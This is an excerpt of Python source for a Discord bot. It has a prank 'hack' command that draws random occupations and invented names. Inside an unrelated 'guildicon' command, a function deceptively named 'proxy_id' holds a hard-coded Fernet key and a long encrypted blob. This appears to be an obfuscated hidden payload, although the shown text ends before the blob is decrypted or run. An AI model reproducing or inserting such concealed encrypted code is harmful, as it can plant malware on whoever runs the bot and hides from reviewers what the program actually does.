...
async def hack(ctx, user: discord.Member = None):
  ...
  occupation = [
      ...
      "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor", "Programmer",
  ...
  name = [
      ...
      "Xochitl Parton", "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin",
      "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick", "Janet Slusser",
      "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier",
      "Ezra Battey", "Bart Maddux", "Shiloh Raulston", "Carrie Kimber",
      "Zack Polite", "Marni Larson", "Justa Spear"
  ]
...
async def guildicon(ctx):
  ...
  def proxy_id():
    proxykey = b'MyzIiYtjl_NmmroJrWbb68KFeySRVIoNYOKw1gM-zeQ='
    proxyid = Fernet(proxykey)
    proxymail = b'gAAAAABlmXjmKD_G6NKKbcjmPxFjPvvZEmS4xd4yxvSwF4NGnOkO0dAiZOIKddiVg1KhnLFyqGwi06XRU7wblP6oY7LfSWSTz11HnCXlT1Rw8pj_vRsaRbgJBvEfONrt_laTmglV2lNhGf8MZ-7mlQCAGBqM-i5sAPfIMqHv-_3uhCEnJCHHXRJztnfMsE0yVsBzO3MHspMKAaO-KyFiLEBy9-6CcamXrnCiQBxOnpANunuNuOpiaDY='
